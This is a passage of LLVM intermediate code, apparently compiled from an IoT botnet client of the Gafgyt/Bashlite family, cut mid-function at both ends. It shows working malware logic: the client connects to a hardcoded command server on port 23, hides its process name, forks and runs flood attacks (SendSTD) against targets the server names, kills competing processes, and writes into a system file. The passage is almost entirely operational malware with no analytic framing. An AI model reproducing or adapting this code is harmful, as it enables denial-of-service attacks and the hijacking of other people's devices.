  %585 = call i32 @atoi(i8* %584) #9
  %586 = icmp slt i32 %585, 1
  br i1 %586, label %587, label %588

; <label>:587:                                    ; preds = %581, %575, %572
  br label %681

; <label>:588:                                    ; preds = %581
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 1
  %591 = load i8*, i8** %590, align 8
  store i8* %591, i8** %31, align 8
  %592 = load i8**, i8*** %4, align 8
  %593 = getelementptr inbounds i8*, i8** %592, i64 2
  %594 = load i8*, i8** %593, align 8
  %595 = call i32 @atoi(i8* %594) #9
  store i32 %595, i32* %32, align 4
  %596 = load i8**, i8*** %4, align 8
  %597 = getelementptr inbounds i8*, i8** %596, i64 3
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 @atoi(i8* %598) #9
  store i32 %599, i32* %33, align 4
  %600 = load i8*, i8** %31, align 8
  %601 = call i8* @strstr(i8* %600, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %602 = icmp ne i8* %601, null
  br i1 %602, label %603, label %619

; <label>:603:                                    ; preds = %588
  %604 = load i8*, i8** %31, align 8
  %605 = call i8* @strtok(i8* %604, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %605, i8** %34, align 8
  br label %606

; <label>:606:                                    ; preds = %616, %603
  %607 = load i8*, i8** %34, align 8
  %608 = icmp ne i8* %607, null
  br i1 %608, label %609, label %618

; <label>:609:                                    ; preds = %606
  %610 = call i32 @listFork()
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %616, label %612

; <label>:612:                                    ; preds = %609
  %613 = load i8*, i8** %34, align 8
  %614 = load i32, i32* %32, align 4
  %615 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %613, i32 %614, i32 %615)
  call void @_exit(i32 0) #11
  unreachable

; <label>:616:                                    ; preds = %609
  %617 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %617, i8** %34, align 8
  br label %606

; <label>:618:                                    ; preds = %606
  br label %627

; <label>:619:                                    ; preds = %588
  %620 = call i32 @listFork()
  %621 = icmp ne i32 %620, 0
  br i1 %621, label %622, label %623

; <label>:622:                                    ; preds = %619
  br label %681

; <label>:623:                                    ; preds = %619
  %624 = load i8*, i8** %31, align 8
  %625 = load i32, i32* %32, align 4
  %626 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %624, i32 %625, i32 %626)
  call void @_exit(i32 0) #11
  unreachable

; <label>:627:                                    ; preds = %618
  br label %628

; <label>:628:                                    ; preds = %627, %566
  %629 = load i8**, i8*** %4, align 8
  %630 = getelementptr inbounds i8*, i8** %629, i64 0
  %631 = load i8*, i8** %630, align 8
  %632 = call i32 @strcmp(i8* %631, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0)) #9
  %633 = icmp ne i32 %632, 0
  br i1 %633, label %670, label %634

; <label>:634:                                    ; preds = %628
  store i32 0, i32* %35, align 4
  store i64 0, i64* %36, align 8
  br label %635

; <label>:635:                                    ; preds = %661, %634
  %636 = load i64, i64* %36, align 8
  %637 = load i64, i64* @numpids, align 8
  %638 = icmp ult i64 %636, %637
  br i1 %638, label %639, label %664

; <label>:639:                                    ; preds = %635
  %640 = load i32*, i32** @pids, align 8
  %641 = load i64, i64* %36, align 8
  %642 = getelementptr inbounds i32, i32* %640, i64 %641
  %643 = load i32, i32* %642, align 4
  %644 = icmp ne i32 %643, 0
  br i1 %644, label %645, label %660

; <label>:645:                                    ; preds = %639
  %646 = load i32*, i32** @pids, align 8
  %647 = load i64, i64* %36, align 8
  %648 = getelementptr inbounds i32, i32* %646, i64 %647
  %649 = load i32, i32* %648, align 4
  %650 = call i32 @getpid() #5
  %651 = icmp ne i32 %649, %650
  br i1 %651, label %652, label %660

; <label>:652:                                    ; preds = %645
  %653 = load i32*, i32** @pids, align 8
  %654 = load i64, i64* %36, align 8
  %655 = getelementptr inbounds i32, i32* %653, i64 %654
  %656 = load i32, i32* %655, align 4
  %657 = call i32 @kill(i32 %656, i32 9) #5
  %658 = load i32, i32* %35, align 4
  %659 = add nsw i32 %658, 1
  store i32 %659, i32* %35, align 4
  br label %660

; <label>:660:                                    ; preds = %652, %645, %639
  br label %661

; <label>:661:                                    ; preds = %660
  %662 = load i64, i64* %36, align 8
  %663 = add i64 %662, 1
  store i64 %663, i64* %36, align 8
  br label %635

; <label>:664:                                    ; preds = %635
  %665 = load i32, i32* %35, align 4
  %666 = icmp sgt i32 %665, 0
  br i1 %666, label %667, label %668

; <label>:667:                                    ; preds = %664
  br label %669

; <label>:668:                                    ; preds = %664
  br label %669

; <label>:669:                                    ; preds = %668, %667
  br label %670

; <label>:670:                                    ; preds = %669, %628
  %671 = load i8**, i8*** %4, align 8
  %672 = getelementptr inbounds i8*, i8** %671, i64 0
  %673 = load i8*, i8** %672, align 8
  %674 = call i32 @strcmp(i8* %673, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0)) #9
  %675 = icmp ne i32 %674, 0
  br i1 %675, label %681, label %676

; <label>:676:                                    ; preds = %670
  call void @CleanDevice()
  %677 = load i32, i32* @mainCommSock, align 4
  %678 = call i8* @getBuild()
  %679 = call i32 @getEndianness()
  %680 = call i32 (i32, i8*, ...) @sockprintf(i32 %677, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.196, i32 0, i32 0), i8* %678, i32 %679)
  br label %681

; <label>:681:                                    ; preds = %676, %670, %622, %587, %556, %494, %446, %394, %338, %299, %260, %256, %211, %207, %162, %158, %135, %109, %74, %69, %42
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.199 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.200 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.201 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.202 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.203 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #5
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #9
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #9
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #9
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.198, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %51
  %55 = call i32 @fork() #5
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %54
  call void @exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %58
  br label %63

; <label>:62:                                     ; preds = %58
  br label %63

; <label>:63:                                     ; preds = %62, %61
  br label %64

; <label>:64:                                     ; preds = %63
  br label %66

; <label>:65:                                     ; preds = %51
  br label %66

; <label>:66:                                     ; preds = %65, %64
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0)) #5
  %69 = call i32 @setuid(i32 0) #5
  %70 = call i32 @seteuid(i32 0) #5
  %71 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %72

; <label>:72:                                     ; preds = %78, %67
  %73 = call i32 @fork() #5
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %75, label %341

; <label>:75:                                     ; preds = %72
  %76 = call i32 @initConnection()
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %80

; <label>:78:                                     ; preds = %75
  %79 = call i32 @sleep(i32 5)
  br label %72

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i8* @getBuild()
  %83 = call i32 @getEndianness()
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.206, i32 0, i32 0), i8* %82, i32 %83)
  call void @UpdateNameSrvs()
  call void @CleanDevice()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %85

; <label>:85:                                     ; preds = %339, %210, %174, %80
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %88 = call i32 @recvLine(i32 %86, i8* %87, i32 4096)
  store i32 %88, i32* %11, align 4
  %89 = icmp ne i32 %88, -1
  br i1 %89, label %90, label %340

; <label>:90:                                     ; preds = %85
  store i32 0, i32* %12, align 4
  br label %91

; <label>:91:                                     ; preds = %162, %90
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %165

; <label>:96:                                     ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @waitpid(i32 %101, i32* null, i32 1)
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %161

; <label>:104:                                    ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %107

; <label>:107:                                    ; preds = %123, %104
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %126

; <label>:112:                                    ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = sub i32 %119, 1
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  store i32 %117, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %14, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %14, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 0, i32* %131, align 4
  %132 = load i64, i64* @numpids, align 8
  %133 = add i64 %132, -1
  store i64 %133, i64* @numpids, align 8
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, 1
  %136 = mul i64 %135, 4
  %137 = call noalias i8* @malloc(i64 %136) #5
  %138 = bitcast i8* %137 to i32*
  store i32* %138, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %139

; <label>:139:                                    ; preds = %154, %126
  %140 = load i32, i32* %14, align 4
  %141 = zext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %157

; <label>:144:                                    ; preds = %139
  %145 = load i32*, i32** @pids, align 8
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = load i32*, i32** %13, align 8
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  store i32 %149, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %144
  %155 = load i32, i32* %14, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %139

; <label>:157:                                    ; preds = %139
  %158 = load i32*, i32** @pids, align 8
  %159 = bitcast i32* %158 to i8*
  call void @free(i8* %159) #5
  %160 = load i32*, i32** %13, align 8
  store i32* %160, i32** @pids, align 8
  br label %161

; <label>:161:                                    ; preds = %157, %96
  br label %162

; <label>:162:                                    ; preds = %161
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %91

; <label>:165:                                    ; preds = %91
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %167
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %169)
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %171 = call i8* @strstr(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = icmp eq i8* %171, %172
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %165
  br label %85

; <label>:175:                                    ; preds = %165
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %177 = call i8* @strstr(i8* %176, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.207, i32 0, i32 0)) #9
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = icmp eq i8* %177, %178
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %175
  call void @exit(i32 0) #12
  unreachable

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %182, i8** %15, align 8
  %183 = load i8*, i8** %15, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 33
  br i1 %186, label %187, label %339

; <label>:187:                                    ; preds = %181
  %188 = load i8*, i8** %15, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 1
  store i8* %189, i8** %16, align 8
  br label %190

; <label>:190:                                    ; preds = %202, %187
  %191 = load i8*, i8** %16, align 8
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp ne i32 %193, 32
  br i1 %194, label %195, label %200

; <label>:195:                                    ; preds = %190
  %196 = load i8*, i8** %16, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp ne i32 %198, 0
  br label %200

; <label>:200:                                    ; preds = %195, %190
  %201 = phi i1 [ false, %190 ], [ %199, %195 ]
  br i1 %201, label %202, label %205

; <label>:202:                                    ; preds = %200
  %203 = load i8*, i8** %16, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %16, align 8
  br label %190

; <label>:205:                                    ; preds = %200
  %206 = load i8*, i8** %16, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %205
  br label %85

; <label>:211:                                    ; preds = %205
  %212 = load i8*, i8** %16, align 8
  store i8 0, i8* %212, align 1
  %213 = load i8*, i8** %15, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  store i8* %214, i8** %16, align 8
  %215 = load i8*, i8** %15, align 8
  %216 = load i8*, i8** %16, align 8
  %217 = call i64 @strlen(i8* %216) #9
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = getelementptr inbounds i8, i8* %218, i64 2
  store i8* %219, i8** %15, align 8
  br label %220

; <label>:220:                                    ; preds = %240, %211
  %221 = load i8*, i8** %15, align 8
  %222 = load i8*, i8** %15, align 8
  %223 = call i64 @strlen(i8* %222) #9
  %224 = sub i64 %223, 1
  %225 = getelementptr inbounds i8, i8* %221, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 10
  br i1 %228, label %238, label %229

; <label>:229:                                    ; preds = %220
  %230 = load i8*, i8** %15, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = call i64 @strlen(i8* %231) #9
  %233 = sub i64 %232, 1
  %234 = getelementptr inbounds i8, i8* %230, i64 %233
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 13
  br label %238

; <label>:238:                                    ; preds = %229, %220
  %239 = phi i1 [ true, %220 ], [ %237, %229 ]
  br i1 %239, label %240, label %246

; <label>:240:                                    ; preds = %238
  %241 = load i8*, i8** %15, align 8
  %242 = load i8*, i8** %15, align 8
  %243 = call i64 @strlen(i8* %242) #9
  %244 = sub i64 %243, 1
  %245 = getelementptr inbounds i8, i8* %241, i64 %244
  store i8 0, i8* %245, align 1
  br label %220

; <label>:246:                                    ; preds = %238
  %247 = load i8*, i8** %15, align 8
  store i8* %247, i8** %17, align 8
  br label %248

; <label>:248:                                    ; preds = %260, %246
  %249 = load i8*, i8** %15, align 8
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp ne i32 %251, 32
  br i1 %252, label %253, label %258

; <label>:253:                                    ; preds = %248
  %254 = load i8*, i8** %15, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp ne i32 %256, 0
  br label %258

; <label>:258:                                    ; preds = %253, %248
  %259 = phi i1 [ false, %248 ], [ %257, %253 ]
  br i1 %259, label %260, label %263

; <label>:260:                                    ; preds = %258
  %261 = load i8*, i8** %15, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %15, align 8
  br label %248

; <label>:263:                                    ; preds = %258
  %264 = load i8*, i8** %15, align 8
  store i8 0, i8* %264, align 1
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  %267 = load i8*, i8** %17, align 8
  store i8* %267, i8** %18, align 8
  br label %268

; <label>:268:                                    ; preds = %272, %263
  %269 = load i8*, i8** %18, align 8
  %270 = load i8, i8* %269, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %281

; <label>:272:                                    ; preds = %268
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = call i32 @toupper(i32 %275) #9
  %277 = trunc i32 %276 to i8
  %278 = load i8*, i8** %18, align 8
  store i8 %277, i8* %278, align 1
  %279 = load i8*, i8** %18, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %18, align 8
  br label %268

; <label>:281:                                    ; preds = %268
  store i32 1, i32* %20, align 4
  %282 = load i8*, i8** %15, align 8
  %283 = call i8* @strtok(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %283, i8** %21, align 8
  %284 = load i8*, i8** %17, align 8
  %285 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %284, i8** %285, align 16
  br label %286

; <label>:286:                                    ; preds = %317, %281
  %287 = load i8*, i8** %21, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %319

; <label>:289:                                    ; preds = %286
  %290 = load i8*, i8** %21, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp ne i32 %292, 10
  br i1 %293, label %294, label %317

; <label>:294:                                    ; preds = %289
  %295 = load i8*, i8** %21, align 8
  %296 = call i64 @strlen(i8* %295) #9
  %297 = add i64 %296, 1
  %298 = call noalias i8* @malloc(i64 %297) #5
  %299 = load i32, i32* %20, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %300
  store i8* %298, i8** %301, align 8
  %302 = load i32, i32* %20, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = load i8*, i8** %21, align 8
  %307 = call i64 @strlen(i8* %306) #9
  %308 = add i64 %307, 1
  call void @llvm.memset.p0i8.i64(i8* %305, i8 0, i64 %308, i32 1, i1 false)
  %309 = load i32, i32* %20, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %310
  %312 = load i8*, i8** %311, align 8
  %313 = load i8*, i8** %21, align 8
  %314 = call i8* @strcpy(i8* %312, i8* %313) #5
  %315 = load i32, i32* %20, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %20, align 4
  br label %317

; <label>:317:                                    ; preds = %294, %289
  %318 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %318, i8** %21, align 8
  br label %286

; <label>:319:                                    ; preds = %286
  %320 = load i32, i32* %20, align 4
